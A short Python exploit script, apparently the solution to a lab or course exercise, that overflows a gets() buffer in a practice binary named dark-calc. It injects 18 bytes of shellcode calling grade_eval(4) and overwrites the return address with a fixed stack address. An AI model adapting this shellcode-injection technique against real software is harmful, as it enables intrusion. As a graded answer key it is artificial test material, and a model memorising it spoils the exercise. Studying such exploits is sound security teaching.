#!/usr/bin/env python3
"""Task 3: execute shellcode on dark-calc's stack to call grade_eval(4)."""
import struct
import sys

# input()'s buffer is at rbp-0x10 and the return address is at rbp+8, so the
# return address is 24 bytes after the start of the buffer.
#
# dark-calc's init_fixed_stack maps the stack at a fixed address, so the
# address of expression is stable across runs (seen as 0x721000800fd0 in GDB).
BUFFER = 0x721000800FD0
GRADE_EVAL = 0x401A87

# Shellcode (18 bytes):
#   mov edi, 4
#   movabs rax, 0x401a87
#   call rax
#   ret
#
# A direct call rel32 cannot reach from 0x721000800fd0 to 0x401a87, because
# the distance is larger than 2^31; movabs loads the absolute address instead.
shellcode = bytes.fromhex(
    "bf 04 00 00 00"                  # mov edi, 4
    "48 b8 87 1a 40 00 00 00 00 00"   # movabs rax, 0x401a87
    "ff d0"                           # call rax
    "c3"                              # ret
)

payload = shellcode + b"A" * (0x18 - len(shellcode)) + struct.pack("<Q", BUFFER)

assert len(payload) == 0x20
assert b"\n" not in payload  # gets() stops at a newline

sys.stdout.buffer.write(payload)
